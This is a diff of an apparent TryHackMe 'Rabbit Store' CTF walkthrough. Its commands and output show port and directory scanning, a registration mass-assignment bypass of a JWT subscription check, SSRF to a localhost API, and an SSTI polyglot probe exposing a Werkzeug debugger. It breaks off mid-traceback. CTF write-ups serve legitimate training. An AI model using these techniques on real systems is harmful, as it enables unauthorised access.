@@ -11,15 +11,23 @@ image:
   path: /assets/img/2025-07-07-TryHackMe-Rabbit_Store/main.webp
 ---
 
-Hi I'm making TryHackMe <https://tryhackme.com/room/rabbitstore> room.
+Hey everyone! Welcome to another CTF walkthrough. Today, we're diving into the [Rabbit Store](https://tryhackme.com/room/rabbitstore) room on TryHackMe. This box was a fantastic journey through web app vulnerabilities, JWT manipulation, and a fun privilege escalation involving... well, rabbits!
+
+Let's hop to it!
 
 ---
 
+### Initial Reconnaissance: Nmap on the Prowl
+
+First things first, let's get the lay of the land. We'll start by setting our target IP and then unleashing our trusty friend, Nmap, to see what doors are open.
+
 ```bash
+# Setting the IP address for easy access
 export IP=10.10.144.3
 ```
 
 ```bash
+# Let's see what we're working with. Full port scan, service version, and default scripts.
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
 Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-07 14:24 +0300
 Nmap scan report for 10.10.144.3
@@ -41,6 +49,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 187.62 seconds
 ```
 
+### Web Enumeration: Down the Rabbit Hole
+
+The Nmap scan gave us a domain name. Let's see what happens when we try to `curl` the IP directly.
+
 ```bash
 ❯ curl $IP
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -54,46 +66,37 @@ Nmap done: 1 IP address (1 host up) scanned in 187.62 seconds
 </body></html>
 ```
 
-Lets add `cloudsite.thm` to `/etc/hosts`
+Just as we suspected, a redirect. To access the site properly, we need to tell our machine how to find `cloudsite.thm`. Let's add it to our `/etc/hosts` file.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo1.webp){: width="972" height="589" }
 
-You can see that this is a site cloud Saas website template
+With that done, we can browse the site. It looks like a standard cloud SaaS website template. Clicking the "Log In" button whisks us away to a new subdomain: `storage.cloudsite.thm`.
 
-If you try to click log in you'll directed to `storage.cloudsite.thm`.
-
-Lets try adding this to our `/etc/hosts`
+Time for another entry in our `/etc/hosts` file!
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo2.webp){: width="972" height="589" }
 
-I tried admin admin but It wanted me a e mail lets look at the site for any emails.
+Now we're at a login page. I tried the classic `admin:admin`, but it demanded an email address. Fair enough. A quick look around the main site's source code and contact page revealed a couple of emails.
 
 ```text
 info@smarteyeapps.com
 sales@smarteyeapps.com
 ```
 
-I found this too maybe it can be helpful.
-
-The login request is like this
+These might come in handy later. I also noticed that the login request is a JSON POST to `/api/login`.
 
 ```text
-{"email":"pwned@pwned.com","password":"123123123"}
+{"email":"pwned@pwned.com","password":"1234"}
 ```
 
-on `http://storage.cloudsite.thm/api/login` end
-
-I also created a account named pwned@pwned.com password 1234
-
-When I log in I see this.
+I created my own account (`pwned@pwned.com` with password `1234`) to see what a regular user can do.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo3.webp){: width="972" height="589" }
 
-Which means we can't do anything with this account.
-
-We can brute force found emails but firstly fuzz the website using `gobuster`
+"Your subscription is inactive." Well, that's not very useful. It seems we're stuck... or are we? Before trying to brute-force the emails we found, let's do some more directory fuzzing with our old friend, `gobuster`.
 
 ```bash
+# Fuzzing the main site
 ❯ gobuster dir -w common.txt -u http://cloudsite.thm -x md,js,html,php,py,css,txt,bak -t 50
 ===============================================================
 Gobuster v3.7
@@ -126,6 +129,7 @@ Finished
 ```
 
 ```bash
+# Fuzzing the storage subdomain
 ❯ gobuster dir -w common.txt -u http://storage.cloudsite.thm -x md,js,html,php,py,css,txt,bak -t 50
 ===============================================================
 Gobuster v3.7
@@ -158,20 +162,10 @@ Finished
 ===============================================================
 ```
 
-I found on the assets config-scss.bat
-
-Which is a bat file.
-
-```text
-cd E:\smarteye\consulting\3\html\assets
-sass --watch scss/style.scss:css/style.css
-```
-
-This could be useful maybe.
-
-Now lets fuzz api endpoint.
+Let's fuzz the `/api/` endpoint on the storage site next.
 
 ```bash
+# Fuzzing the API
 ❯ gobuster dir -w common.txt -u http://storage.cloudsite.thm/api/ -x md,js,html,php,py,css,txt,bak -t 50
 ===============================================================
 Gobuster v3.7
@@ -200,35 +194,36 @@ Finished
 ===============================================================
 ```
 
-I don't know what but there are two login endpoint `Login` and `login`
-
-Maybe Login one could be vulnerable
-
-I don't know what but i nuked my previus acocunt whatever make new one.
-
-After trying /api/docs I found something:
+We found a few endpoints: `/login`, `/register`, `/uploads`, and `/docs`. The case-sensitive `/Login` is a fun little quirk. Also I nuked my previous account (oops) and made a new one, I started poking at these endpoints. Trying to access `/api/uploads` without being authenticated gives a clear message:
 
 ```bash
 ❯ curl -s http://storage.cloudsite.thm/api/uploads
 {"message":"Token not provided"}%
 ```
 
-If we go to the browser I get:
+With my logged-in user's cookie, the message changes:
 
 ```text
 message	"Your subscription is inactive. You cannot use our services."
 ```
 
+Let's use `curl` to confirm this with the JWT token from the browser.
+
 ```bash
+# My JWT cookie proves my subscription is, in fact, inactive.
 ❯ curl -s 'http://storage.cloudsite.thm/api/uploads' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc1MTg4OTkyMywiZXhwIjoxNzUxODkzNTIzfQ.qQb3z00lku8yAT6qCmXzKfugOoiJhbYV54va3Fmc07w'
 {"message":"Your subscription is inactive. You cannot use our services."}%
 ```
 
-So maybe there is a thing in the token lets decode the token first.
+### JWT Exploitation: Activating Our Subscription
 
-After jwt decode I get this.
+Aha! The JWT (JSON Web Token) seems to be the key. Let's decode it and see what's inside.
 
 ```text
+# Header
+{ "alg": "HS256", "typ": "JWT" }
+
+# Payload
 {
     "email": "a@a.com",
     "subscription": "inactive",
@@ -237,9 +232,12 @@ After jwt decode I get this.
 }
 ```
 
-Lets register a new user with subscription active.
+The `"subscription": "inactive"` part looks mighty suspicious. If the application is just trusting this value without server-side verification, we might be able to... _persuade_ it.
+
+Since the `/api/register` endpoint is open, let's try registering a new user, but this time, we'll add our own `subscription` parameter to the request!
 
 ```bash
+# Let's see if the backend is naive enough to accept our custom parameter.
 ❯ curl -X POST 'http://storage.cloudsite.thm/api/register' -d '{
     "email": "b@b.com",
     "password": "1234",
@@ -248,33 +246,29 @@ Lets register a new user with subscription active.
 {"message":"User registered successfully"}%
 ```
 
+It worked! I logged in with our new "active" user `b@b.com`.
+
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo4.webp){: width="972" height="589" }
 
-And look what i found
-
-We can upload files.
+Success! We now have an active subscription and access to the file upload feature.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo5.webp){: width="972" height="589" }
 
-I upload some file and when i go to the /api/uploads/\* it downloads the file.
+### SSRF and Leaking API Docs
 
-We can also upload from url some maybe giving /api/docs downloads the docs.
+The dashboard allows uploading files from our computer or from a URL. Uploading a file and accessing it via `/api/uploads/<filename>` just downloads it, so no RCE there. But the "upload from URL" feature is a classic vector for Server-Side Request Forgery (SSRF).
+
+Let's see if we can make the server fetch the `/api/docs` endpoint that was previously forbidden to us.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo6.webp){: width="972" height="589" }
 
-And it downloaded
+The result was a file containing `{"message": "Access denied"}`. Drats. This probably means the server is fetching the URL over the public internet, where it can't access internal-only endpoints.
 
-```json
-{ "message": "Access denied" }
-```
-
-I think we should use localhost because it reroutes over internet which is giving access denied error.
-
-If we look at the http headers we can see that it uses express on the backend so i'm guessing it works on localhost 3000
+However, the HTTP response headers revealed the backend is using ExpressJS (`X-Powered-By: Express`). A common setup for Node.js/Express apps is to run on a local port like `3000`. Let's try to get the server to talk to itself via `localhost`.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo7.webp){: width="972" height="589" }
 
-And it gave me this file:
+Bingo! This time, it worked and gave us the API documentation.
 
 ```text
 Endpoints Perfectly Completed
@@ -294,26 +288,27 @@ GET Requests:
 Note: All requests to this endpoint are sent in JSON format.
 ```
 
-So there is still one api endpoint we didn't find out. Which is /api/fetch_messeges_from_chatbot
+We've found another hidden endpoint: `/api/fetch_messeges_from_chatbot`. Let's poke it.
 
 ```bash
+# It requires a token, just like the other authenticated endpoints.
 ❯ curl -s 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot'
 {"message":"Token not provided"}%
 ```
 
-Firtlt grep the token from browser:
+### SSTI to Reverse Shell: The Final Foothold
+
+Time to grab our active user's JWT and see what this chatbot endpoint wants.
 
 ```json
 jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g
 ```
 
-Lets firstly post empty data to the /api/fetch_messeges_from_chatbot endpoint
+Sending an empty POST request tells us what we need.
 
 ```bash
 ❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{"":""}'
 ```
-
-And we get
 
 ```json
 {
@@ -321,13 +316,15 @@ And we get
 }
 ```
 
-Lets use the body'ies we used before for test.
+Okay, it wants a `username`. Let's give it one.
 
 ```bash
 ❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{
     "username": "b"
 }'
 ```
+
+The response is interesting. It reflects our input directly into an HTML template.
 
 ```html
 <!DOCTYPE html>
@@ -338,63 +335,25 @@ Lets use the body'ies we used before for test.
     <title>Greeting</title>
   </head>
   <body>
-    <h1>Sorry, b@b.com, our chatbot server is currently under development.</h1>
+    <h1>Sorry, b, our chatbot server is currently under development.</h1>
   </body>
 </html>
 %
 ```
 
-```bash
-❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{
-    "username": "b"
-}'
-<!DOCTYPE html>
-<html lang="en">
- <head>
-   <meta charset="UTF-8">
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-       <title>Greeting</title>
- </head>
- <body>
-   <h1>Sorry, b, our chatbot server is currently under development.</h1>
- </body>
-</html>%
+This is a huge red flag for Server-Side Template Injection (SSTI). The server is likely taking our `username` and rendering it inside a template without proper sanitization. Let's try a universal SSTI polyglot payload to see if we can trigger an error.
+
+I used this payload:
+
+```json
+{ "username": "${{<%[%'\"}}%\\." }
 ```
 
-```bash
-❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{
-    "username": "admin"
-}'
-<!DOCTYPE html>
-<html lang="en">
- <head>
-   <meta charset="UTF-8">
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-       <title>Greeting</title>
- </head>
- <body>
-   <h1>Sorry, admin, our chatbot server is currently under development.</h1>
- </body>
-</html>%
-```
-
-Lets fuzz this using `ffuf`
-
-At some point I thought about using polygot SSTI payload such as `${{<%[%'"}}%\.`
-
-Lets try that
-
-```bash
-❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{
-    {"username":"${{<%[%'\"}}%\\."}
-}'
-```
-
-Also my shell sucked by regex so i need to use other tool.
-
-So i'll use `yaak`
+Since my shell was mangling the special characters, I switched to a GUI REST client (`yaak`) for this part.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo8.webp){: width="972" height="589" }
+
+Houston, we have an error!
 
 ```html
 <!doctype html>
@@ -404,621 +363,14 @@ So i'll use `yaak`
       jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39; //
       Werkzeug Debugger
     </title>
-    <link
-      rel="stylesheet"
-      href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
-    />
-    <link
-      rel="shortcut icon"
-      href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png"
-    />
-    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
-    <script>
-      var CONSOLE_MODE = false,
-        EVALEX = true,
-        EVALEX_TRUSTED = false,
-        SECRET = "3N5KsqGECxMzhx9H1W24";
-    </script>
+    ...
   </head>
-  <body style="background-color: #fff">
-    <div class="debugger">
-      <h1>TemplateSyntaxError</h1>
-      <div class="detail">
-        <p class="errormsg">
-          jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
-        </p>
-      </div>
-      <h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
-      <div class="traceback">
-        <h3></h3>
-        <ul>
-          <li>
-            <div class="frame" id="frame-139714297136624">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">1498</em>, in
-                <code class="function">__call__</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>wrapped to apply middleware.</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>&#34;&#34;&#34;</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878416">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">1476</em>, in
-                <code class="function">wsgi_app</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>try:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>ctx.push()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>response = self.full_dispatch_request()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>except Exception as e:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>error = e</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">                </span>response = self.handle_exception(e)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">            </span>except:  # noqa: B001</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">                </span>error = sys.exc_info()[1]</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">                </span>raise</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">            </span>return response(environ, start_response)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>finally:</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878528">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">1473</em>, in
-                <code class="function">wsgi_app</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>ctx = self.request_context(environ)</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>error: BaseException | None = None</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>try:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>try:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>ctx.push()</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">                </span>response = self.full_dispatch_request()</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">            </span>except Exception as e:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">                </span>error = e</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">                </span>response = self.handle_exception(e)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">            </span>except:  # noqa: B001</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">                </span>error = sys.exc_info()[1]</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878640">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">882</em>, in
-                <code class="function">full_dispatch_request</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>rv = self.preprocess_request()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>if rv is None:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>rv = self.dispatch_request()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>except Exception as e:</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>return self.finalize_request(rv)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def finalize_request(</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>self,</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878752">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">880</em>, in
-                <code class="function">full_dispatch_request</code>
-              </h4>
-              <div class="source ">
-                <pre class="line before"><span class="ws"></span> </pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>try:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>rv = self.preprocess_request()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>if rv is None:</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">                </span>rv = self.dispatch_request()</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>except Exception as e:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>return self.finalize_request(rv)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def finalize_request(</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878864">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite
-                >, line <em class="line">865</em>, in
-                <code class="function">dispatch_request</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>):</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>return self.make_default_options_response()</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>error handling.</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152878976">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/chatbotServer/chatbot.py"</cite
-                >, line <em class="line">24</em>, in
-                <code class="function">index</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws"> </span>&lt;body&gt;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">   </span>&lt;h1&gt;Sorry, {}, our chatbot server is currently under development.&lt;/h1&gt;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws"> </span>&lt;/body&gt;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws"></span>&lt;/html&gt;&#39;&#39;&#39;.format(username)</pre>
-                <pre class="line before"><span class="ws"></span> </pre>
-                <pre
-                  class="line current"
-                ><span class="ws">    </span>return render_template_string(template)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws"></span>if __name__ == &#39;__main__&#39;:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>app.run(debug=True, port=8000)</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152879088">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py"</cite
-                >, line <em class="line">161</em>, in
-                <code class="function">render_template_string</code>
-              </h4>
-              <div class="source ">
-                <pre class="line before"><span class="ws"></span> </pre>
-                <pre
-                  class="line before"
-                ><span class="ws">    </span>:param source: The source code of the template to render.</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">    </span>:param context: The variables to make available in the template.</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">    </span>&#34;&#34;&#34;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">    </span>app = current_app._get_current_object()  # type: ignore[attr-defined]</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">    </span>template = app.jinja_env.from_string(source)</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>return _render(app, template, context)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws"></span>def _stream(</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>app: Flask, template: Template, context: dict[str, t.Any]</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714152881888">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite
-                >, line <em class="line">1108</em>, in
-                <code class="function">from_string</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>:param template_class: Return an instance of this</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>:class:`Template` class.</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>&#34;&#34;&#34;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>gs = self.make_globals(globals)</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>cls = template_class or self.template_class</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">        </span>return cls.from_code(self, self.compile(source), gs, None)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def make_globals(</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>self, d: t.Optional[t.MutableMapping[str, t.Any]]</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>) -&gt; t.MutableMapping[str, t.Any]:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>&#34;&#34;&#34;Make the globals map for a template. Any given template</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714153021616">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite
-                >, line <em class="line">768</em>, in
-                <code class="function">compile</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>return source</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>if filename is None:</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">                </span>filename = &#34;&lt;template&gt;&#34;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">            </span>return self._compile(source, filename)</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>except TemplateSyntaxError:</pre>
-                <pre
-                  class="line current"
-                ><span class="ws">            </span>self.handle_exception(source=source_hint)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def compile_expression(</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>self, source: str, undefined_to_none: bool = True</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>) -&gt; &#34;TemplateExpression&#34;:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>&#34;&#34;&#34;A handy helper method that returns a callable that accepts keyword</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714153021728">
-              <h4>
-                File
-                <cite class="filename"
-                  >"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite
-                >, line <em class="line">939</em>, in
-                <code class="function">handle_exception</code>
-              </h4>
-              <div class="source ">
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>&#34;&#34;&#34;Exception handling helper.  This is used internally to either raise</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>rewritten exceptions or return a rendered traceback for the template.</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>&#34;&#34;&#34;</pre>
-                <pre
-                  class="line before"
-                ><span class="ws">        </span>from .debug import rewrite_traceback_stack</pre>
-                <pre class="line before"><span class="ws"></span> </pre>
-                <pre
-                  class="line current"
-                ><span class="ws">        </span>raise rewrite_traceback_stack(source=source)</pre>
-                <pre class="line after"><span class="ws"></span> </pre>
-                <pre
-                  class="line after"
-                ><span class="ws">    </span>def join_path(self, template: str, parent: str) -&gt; str:</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>&#34;&#34;&#34;Join a template with the parent.  By default all the lookups are</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>relative to the loader root so this method returns the `template`</pre>
-                <pre
-                  class="line after"
-                ><span class="ws">        </span>parameter unchanged, but if the paths should be relative to the</pre>
-              </div>
-            </div>
-          </li>
-
-          <li>
-            <div class="frame" id="frame-139714153021840">
-              <h4>
-                File <cite class="filename">"&lt;unknown&gt;"</cite>, line
-                <em class="line">9</em>, in
-                <code class="function">template</code>
-              </h4>
-              <div class="source "></div>
-            </div>
-          </li>
-        </ul>
-        <blockquote>
-          jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
-        </blockquote>
-      </div>
-
-      <div class="plain">
-        <p>This is the Copy/Paste friendly version of the traceback.</p>
-        <textarea cols="50" rows="10" name="code" readonly>
-Traceback (most recent call last):
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1498, in __call__
-    return self.wsgi_app(environ, start_response)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
-    response = self.handle_exception(e)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
